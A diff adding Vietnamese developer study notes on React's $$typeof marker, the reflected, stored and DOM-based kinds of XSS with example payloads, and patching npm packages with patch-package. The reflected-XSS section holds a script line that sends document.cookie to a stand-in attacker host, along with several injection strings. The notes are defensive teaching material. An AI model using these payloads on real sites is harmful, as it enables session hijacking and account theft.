@@ -16,3 +16,39 @@ Additional Hooks: useReducer, useMemo, useCallback,..
  
 side effect là data fetching, còn có thể là cập nhập DOM, set up a subscription,...
 
+Phân tích $$typeof khi ta log 1 biến JSX Element trong react:
+Ngày xưa họ dùng:
+const messageEl = document.getElementById('message');
+messageEl.innerHTML = '<p>' + message.text + '</p>';
+=> trông rất ok cho đến khi: họ nhét JS vào message.text Vd:
+<img src onerror="stealYourPassword()"> nhét vào message.text
+Kiểu tấn công này gọi là XSS, để tránh nó thì người ta dùng textContent.
+Trong React, họ dùng JSX k tránh được hoàn toàn kiểu tấn công này. Nó chỉ k thực thi script chứ nếu HTML thì vẫn dính. VD: input đầu vào gì đó xong hacker chơi kiểu: <div {...userData}>Item or <a href={user.website}>Item thì vẫn toang 
+
+Tấn công XSS(Cross Site Scripting): là kiểu tấn công bằng cách thêm các đoạn script có khả năng truy cập vào thông tin trang web=> kbh được tin input ở phía client
+VD: bất cứ trang web nào khi họ dùng tính năng input dữ liệu text vào mà k phòng chống XSS thì rất dễ toang. VD họ làm tính năng addData vào database từ input của người dùng=> người dùng add vào: <script>alert("hacked")</script>Item thì database lưu ra như v nhưng khi client khác request vào thì browser lại chạy script kia thế là mọi client khác đều hiện dòng chữ hacked alert ra=> Đó là lý do script rất nguy hiểm, luôn phòng tránh 1 người có khả năng thêm script vào trình duyệt 1 client khác
+Nếu họ cho dữ liệu đó là html thì có thể làm kiểu: <span onmouseover="alert("hacked")"></span> cx đc
+=> Nch là có rất nhiểu kiểu hack XSS nhưng thg thì hacker sẽ dùng code JS để truy cập vào cookies or storage để lấy ra các trường tk mk vì cookies thường lưu luôn tk mk user để đăng nhập nhanh thì với script họ có thể lấy được các thứ đó. Sau đó gửi dữ liệu đó về 1 server khác để lấy
+=> Để phòng chống ta có thể dùng XSS filter, có rất nhiều thư viện cho phép lọc đầu vào của người dùng nếu chứa cái gì thì k cho phép người dùng nhập input như v. Or ta dùng các PP chống vc render JS mỗi khi người dùng nhập input. Lọc các trường <script> bỏ đi chẳng hạn
+Có nhiều tool giúp tấn công XSS với nh hình thức, phổ biến nhất vẫn là tấn công bằng JS và HTML từ phía client chèn script độc hại
+Các loại tấn công XSS:
+1) Reflected XSS: VD chiếm phiên làm vc của người dùng-> chiếm quyền của họ trên website
+Người dùng đăng nhập vào trình duyệt sẽ được gán 1 session cookies-> somehow, hacker gửi cho người dùng 1 URL-> người dùng truy cập vào URL đó-> URL đó là trang web do hacker tạo ra có nhiệm vụ gửi request tới cái trang web kia-> server phản hồi cho nạn nhân kèm dữ liệu có trong request trong đoạn JS của hacker-> trình duyệt nạn nhân nhận phản hồi và thực thi đoạn script-> giả sử đoạn script người dùng tạo ra là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;=> là gửi request đến site của hack với tham số là session cookies của người dùng-> từ phía site của mình, hacker bắt được request trên và lấy được session cookies của nạn nhân
+2) Stored XSS: khai thác input k được bảo mật tốt để chèn vào database đoạn mã nguy hiểm
+Hacker chèn script độc hại vào database-> nạn nhân khi nào đó truy cập vào web, nếu nạn nhân là quản trị viên thì mất luôn web-> nạn nhân đăng nhập-> mã độc của hacker được thực thi trên trình duyệt của user lúc đó-> session gửi lại cho hacker-> hacker chiếm được session thì vào web như thg
+=> Nguy hiểm hơn vì phạm vi rộng trong khi Reflected XSS thì hacker phải lừa nạn nhân đăng nhập r truy cập đến url mà hắn ta cung cấp để thực thi mã độc
+3) DOM Based XSS: thay đổi cấu trúc form
+Cơ chế giống như cách 1
+VD: Người dùng đăng nhập vào 1 trang web-> nhưng trước đó hacker lừa người dùng truy cập vào 1 URL của trang web đó để đăng nhập thì url đó là:
+http://example.com/register.php?message=Please fill in the form
+với dòng Please fill in the form được hiện dưới form đăng nhập=> bh url của hacker lại là:
+http://example.com/register.php?message=<label>Gender</label><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select>
+<script>function show(){alert("hacked");}</script>
+=> thì cái dòng please fill in the form biến thành 1 input gender vì browser nó render htmk như v-> khi người dùng kb vào chọn render thì script được thực thi
+=> CV check lỗi XSS là của tester. Họ có thể thêm: <script>alert(document.cookie)</script> để test thử mọi trường input
+
+=> $$typeof xuất hiện trong mọi component của react. Ở phiên bản cũ thì k và nó bị dùng để tấn công XSS: user nhập input sang server lưu ở dạng JSON-> client khác truy cập sẽ render ra code JS độc hại. Sang phiên bản mới nó dùng kiểu Symbol để đánh dấu react-element=> user nhập input k thể đặt 1 Symbol vào file json-> backend k lưu data của user ngay ở dạng file JSON để front end lấy nx mà phải xử lý=> Chỉ ok với các trình duyệt phiên bản mới hỗ trợ type Symbol
+
+Để sửa đổi module npm, ta có thể fork repo đó về git của mình và sửa, sau đó sửa đổi file package.json thay số phiên bản bằng "git+<url repo>" => cách này k tốt vì các pakage to lại là con package khác rất phức tạp có thể k chạy. Trang https://gitpkg.vercel.app/ cho phép nhận link github ra câu lệnh npm, rất hay vì npm thực chất cũng chỉ là clone từ github về nhét vào node_modules
+Cách 2: ta sửa đổi trực tiếp trong node_modules r chạy: npx patch-package <package name> thì nó sẽ yêu cầu cài package patch và tạo ra thư mục patches chứa package ta đã sửa-> ta cứ dùng bth là ok r
+=> nếu ta xóa nodemodules và cài lại thì có thể phải làm lại nên thêm lệnh: "postinstall": "npx patch-package" vào script để tự render theo thay đổi của ta khi install lại
